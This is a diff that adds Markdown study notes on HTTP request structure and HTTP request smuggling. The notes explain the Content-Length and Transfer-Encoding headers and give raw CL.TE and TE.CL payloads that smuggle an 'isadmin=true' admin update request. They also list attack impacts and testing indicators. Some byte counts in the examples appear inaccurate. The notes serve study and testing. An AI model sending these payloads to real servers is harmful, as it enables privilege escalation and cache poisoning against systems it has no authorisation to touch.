@@ -33,4 +33,379 @@
 - Edge caching/CDNs - Content Delivery Networks (CDNs) cache content closer to the end user (at the 'edge' of the network) reducing the latency and speeding up the access for users
 - API caching - Caching the responses can significantly reduce back-end processing for APIs that serve similar requests repeatedly.
 
-### Understand HTTP Request Structure
+## 1. HTTP Request Structure
+
+An **HTTP request** consists of three primary components:
+
+### Request Line
+
+Format:
+
+```
+<METHOD> <PATH> <HTTP VERSION>
+```
+
+Example:
+
+```
+POST /admin/login HTTP/1.1
+```
+
+Components:
+
+| Component    | Description                                |
+| ------------ | ------------------------------------------ |
+| Method       | Action to perform (GET, POST, PUT, DELETE) |
+| Path         | Resource being requested                   |
+| HTTP Version | Protocol version (HTTP/1.1, HTTP/2)        |
+
+---
+
+### Request Headers
+
+Headers provide **metadata about the request**.
+
+Examples:
+
+```
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer token
+```
+
+Headers control:
+
+* Content type
+* Authentication
+* Caching behavior
+* Request parsing
+* Encoding methods
+
+---
+
+### Message Body
+
+The **body contains the actual request data**.
+
+Examples:
+
+Form data:
+
+```
+username=test&password=123
+```
+
+JSON:
+
+```
+{
+ "username": "test"
+}
+```
+
+Typically present in:
+
+* POST
+* PUT
+* PATCH requests
+
+---
+
+# Important Headers in Request Smuggling
+
+## Content-Length
+
+Defines the **size of the request body in bytes**.
+
+Example:
+
+```
+POST /submit HTTP/1.1
+Host: good.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+
+q=smuggledData
+```
+
+Meaning:
+
+* Server reads **exactly 14 bytes** of body data.
+
+---
+
+## Transfer-Encoding
+
+Defines **how the body is encoded during transfer**.
+
+Most common value:
+
+```
+Transfer-Encoding: chunked
+```
+
+### Chunked Encoding Format
+
+Example:
+
+```
+POST /submit HTTP/1.1
+Host: good.com
+Transfer-Encoding: chunked
+
+b
+q=smuggledData
+0
+```
+
+Explanation:
+
+| Part           | Meaning                      |
+| -------------- | ---------------------------- |
+| b              | Chunk size in hex (11 bytes) |
+| q=smuggledData | Actual data                  |
+| 0              | End of chunks                |
+
+---
+
+# HTTP Request Smuggling
+
+HTTP Request Smuggling occurs when **front-end and back-end servers interpret request boundaries differently**.
+
+Common scenario:
+
+```
+Client → Proxy/Load Balancer → Backend Server
+```
+
+If these components **prioritize headers differently**, attackers can inject **hidden requests**.
+
+Main cause:
+
+```
+Content-Length vs Transfer-Encoding conflict
+```
+
+---
+
+# CL.TE Request Smuggling
+
+## Meaning
+
+```
+CL.TE = Content-Length / Transfer-Encoding
+```
+
+Behavior:
+
+| Component       | Header Used       |
+| --------------- | ----------------- |
+| Front-end proxy | Content-Length    |
+| Back-end server | Transfer-Encoding |
+
+---
+
+## Example Payload
+
+```
+POST /search HTTP/1.1
+Host: example.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /update HTTP/1.1
+Host: example.com
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+isadmin=true
+```
+
+### How it Works
+
+1. **Front-end server**
+
+   * Uses `Content-Length`
+   * Treats entire payload as **single request**
+
+2. **Back-end server**
+
+   * Uses `Transfer-Encoding`
+   * Stops reading at `0`
+   * Interprets following content as **new request**
+
+Result:
+
+```
+POST /update
+```
+
+becomes a **smuggled request**.
+
+---
+
+## Incorrect Content-Length
+
+If `Content-Length` is incorrect:
+
+Example body:
+
+```
+username=test&query=test
+```
+
+Size:
+
+```
+24 bytes
+```
+
+If header is:
+
+```
+Content-Length: 10
+```
+
+Server reads only:
+
+```
+username=t
+```
+
+Remaining data may become **separate request data**.
+
+---
+
+# TE.CL Request Smuggling
+
+## Meaning
+
+```
+TE.CL = Transfer-Encoding / Content-Length
+```
+
+Behavior:
+
+| Component       | Header Used       |
+| --------------- | ----------------- |
+| Front-end proxy | Transfer-Encoding |
+| Back-end server | Content-Length    |
+
+---
+
+## Example Payload
+
+```
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+78
+POST /update HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+isadmin=true
+0
+```
+
+---
+
+## How TE.CL Works
+
+### Front-End Server
+
+Uses:
+
+```
+Transfer-Encoding: chunked
+```
+
+Reads until:
+
+```
+0
+```
+
+Everything before `0` = body.
+
+---
+
+### Back-End Server
+
+Uses:
+
+```
+Content-Length: 4
+```
+
+Reads only:
+
+```
+78\n
+```
+
+Remaining content:
+
+```
+POST /update HTTP/1.1
+```
+
+becomes a **new backend request**.
+
+---
+
+# Key Differences
+
+| Technique | Front-End Uses    | Back-End Uses     |
+| --------- | ----------------- | ----------------- |
+| CL.TE     | Content-Length    | Transfer-Encoding |
+| TE.CL     | Transfer-Encoding | Content-Length    |
+
+---
+
+# Impact of Request Smuggling
+
+Possible attack outcomes:
+
+* Authentication bypass
+* Cache poisoning
+* Web cache deception
+* Request hijacking
+* Session fixation
+* Admin privilege escalation
+* Backend request manipulation
+
+---
+
+# Key Indicators During Testing
+
+Look for:
+
+* Both headers present
+
+```
+Content-Length
+Transfer-Encoding
+```
+
+* Frontend proxies:
+
+  * Nginx
+  * HAProxy
+  * Cloudflare
+  * AWS ALB
+
+* Backend servers:
+
+  * Apache
+  * Tomcat
+  * Node.js
+  * IIS
+
+---
+
